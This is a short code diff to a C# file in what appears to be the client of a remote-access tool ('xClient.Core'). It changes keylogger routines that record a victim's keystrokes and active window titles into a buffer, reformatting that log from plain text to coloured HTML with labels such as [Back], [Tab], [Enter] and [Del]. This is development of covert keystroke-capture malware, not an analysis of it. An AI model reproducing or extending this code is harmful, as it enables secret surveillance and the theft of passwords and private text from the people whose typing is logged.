@@ -136,26 +136,26 @@ namespace xClient.Core
                         {
                             hWndLastTitle = hWndTitle;
 
-                            keyBuffer += "\n\n[" + hWndTitle + "]\n";
+							keyBuffer += "<br><br>[<b>" + hWndTitle + "</b>]<br>";
                         }
                     }
 
                     switch (i)
                     {
                         case 8:
-                            keyBuffer += "[Back]";
+                            keyBuffer += "<font color=\"33CC33\">[Back]</font>";
                             return;
                         case 9:
-                            keyBuffer += "[Tab]";
+							keyBuffer += "<font color=\"33CC33\">[Tab]</font>";
                             return;
                         case 13:
-                            keyBuffer += "[Enter]\n";
+							keyBuffer += "<font color=\"33CC33\">[Enter]</font><br>";
                             return;
                         case 32:
                             keyBuffer += " ";
                             return;
                         case 46:
-                            keyBuffer += "[Del]";
+							keyBuffer += "<font color=\"33CC33\">[Del]</font>";
                             return;
                     }
 
